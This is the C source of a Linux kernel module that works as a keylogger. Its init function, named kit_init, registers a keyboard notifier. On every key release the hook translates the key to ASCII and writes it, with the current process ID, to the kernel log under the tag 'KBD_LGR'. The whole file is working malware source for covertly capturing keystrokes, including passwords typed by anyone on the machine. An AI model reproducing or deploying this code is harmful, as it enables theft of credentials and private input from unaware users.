#include <linux/module.h>
#include <linux/init.h>
#include <asm/current.h>
#include <linux/sched.h>

// Keyboard hook
#include <linux/keyboard.h>

#define BUFLEN 16

MODULE_LICENSE("GPL");

// Taken from: https://github.com/enaudon/abide/
char *ascii[128] = {
  "", "<SOH>", "<STX>", "<ETX>", "<EOT>", "<ENQ>", "<ACK>", "<BEL>",
  "<BS>",  "<TAB>", "<LF>",  "<VT>",  "<FF>",  "<CR>",  "<SO>",  "<SI>",
  "<DLE>", "<DC1>", "<DC2>", "<DC3>", "<DC4>", "<NAK>", "<SYN>", "<ETB>",
  "<CAN>", "<EM>",  "<SUB>", "<ESC>", "<FS>",  "<GS>",  "<RS>",  "<US>",
  " ","!","\"","#","$","%","&","'","(",")","*","+",",", "-",".","/",
  "0","1","2", "3","4","5","6","7","8","9",":",";","<", "=",">","?",
  "@","A","B", "C","D","E","F","G","H","I","J","K","L", "M","N","O",
  "P","Q","R", "S","T","U","V","W","X","Y","Z","[","\\","]","^","_",
  "`","a","b", "c","d","e","f","g","h","i","j","k","l", "m","n","o",
  "p","q","r", "s","t","u","v","w","x","y","z","{","|", "}","~","<DEL>"    
};


int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    unsigned char type = param->value >> 8;
    unsigned char val  = param->value & 0x00ff;
    char buff[BUFLEN];
//     char proc_name[TASK_COMM_LEN];

    // we only catch keys on the way up
    if(param->down)
        return NOTIFY_OK;
    
//     strlcpy(proc_name, current->comm, TASK_COMM_LEN);
    memset(buff, 0, BUFLEN);

    // check for back space or delete first, then letters & numbers
    if(param->value == 0xf07f) {
        strlcpy(buff, "[BS]", BUFLEN);
    } else if(param->value == 0xf116) {
        strlcpy(buff, "[DEL]", BUFLEN);
    } else if(type == 0xfb || type == 0xf0) {
        strlcpy(buff, ascii[val], BUFLEN);
    } 
        
//     printk(KERN_INFO "0x%08x 0x%08x 0x%08x\n", param->value, param->shift, param->ledstate);

    // see if we got any translation, if not return
    if(buff[0] == '\0' || buff[0] == '<')
        return NOTIFY_OK;

    printk(KERN_INFO "KBD_LGR\t%d: %s\n", current->pid, buff);
    
    

    return NOTIFY_OK;
}

static struct notifier_block keyboard_nb = {
    .notifier_call = key_hook
};

/* Module Init */
static int kit_init(void) {
    printk(KERN_INFO "Module Init!\n");

    // Mount keyboard hook
    register_keyboard_notifier(&keyboard_nb);
    
    return 0;
}

/* Module Exit */
static void kit_exit(void) {
    printk(KERN_INFO "Module Exit!\n");

    // Unmount keyboard hook
    unregister_keyboard_notifier(&keyboard_nb);
}

module_init(kit_init);
module_exit(kit_exit);